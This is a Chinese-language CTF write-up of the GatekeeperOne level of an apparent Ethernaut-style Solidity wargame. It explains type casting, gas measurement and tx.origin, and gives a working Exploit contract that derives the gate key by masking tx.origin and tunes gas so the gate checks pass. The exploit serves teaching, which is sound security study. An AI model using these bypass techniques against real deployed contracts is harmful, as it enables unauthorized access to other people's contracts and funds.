# 第十三关：GatekeeperOne
[toc]
### 本关知识点：
```
1. 类型强制转换
2. 链上gas消耗的计算方式
3. 区分msg.sender和tx.origin
```

## 1. 题目要求
` 越过守门人并且注册为一个参赛者来完成这一关.`

## 2. 代码功能解读
![[2023-05-18_164045.png]]

## 3. 漏洞分析
```
成功调用enter方法
	创建攻击合约调用绕开gateOne的检测
	控制gasleft使求余8191为0
	我们可以根据变量的强制转换方式，找到一个符合以上三个条件的8字节变量
```

我计算gas大小的方法，先执行一次失败的交易，去etherscan中找到gasleft的时候gas的消耗量，然后重新计算后输入正确的gas费用。如图所示，我输入的gas为200000，执行完gasleft()后还剩199744，消耗了256.
![[Pasted image 20230520100311.png]]
![[Pasted image 20230520095408.png]]
我发送的gas数量：819100+256  = 819356

我推到gateKey的推导思路：
  // ffffffffffffffff == ffffffff0000ffff  >> 第九到第十二个字符肯定为0
  // ffffffff0000ffff != 000000000000ffff  >> 前8字符肯定有值
  // ffffffff0000ffff == ffffffff0000ffff(tx.origin)  >>  最后四个字符的值为tx.origin的后四个字符
  由上可知：通过tx.origin和ffffffff0000ffff做与运算就能得到正确的bytes8。


## 4. 攻击方法
```
contract Exploit {

  GatekeeperOne one;

  uint64 number = 0xffffffff0000ffff;

  constructor(address addr) payable{

    one = GatekeeperOne(addr);

  }

  

  function testGas()public {

    bytes8 value;

    value = getValue();

    one.enter{gas: 200000 wei}(value);

  }

  

  function attack(uint256 gasValue_)public {

    bytes8 value;

    value = getValue();

    one.enter{gas: gasValue_}(value);

  }

  function getValue() public view returns(bytes8){

    uint64 message = uint64(uint160(tx.origin));

    bytes8 sendValue = bytes8(number & message);

    return sendValue;

  }

}
```

## 5. 攻击调用图
攻击成功，结果变成了我们自己的地址。
![[Pasted image 20230520100553.png]]
![[Pasted image 20230520100804.png]]

## 6. 知识点分析
	在编写智能合约的过程中，对合约的gas，进制转换和调用者的了解都是很重要的，可以在我们编写合约的时候达到更好的优化效果，也可以让我们更清晰的了解在阅读交易的过程中的调用情况。

如果对大家有用，请点赞；如果喜欢，请订阅加点赞，会一直更新~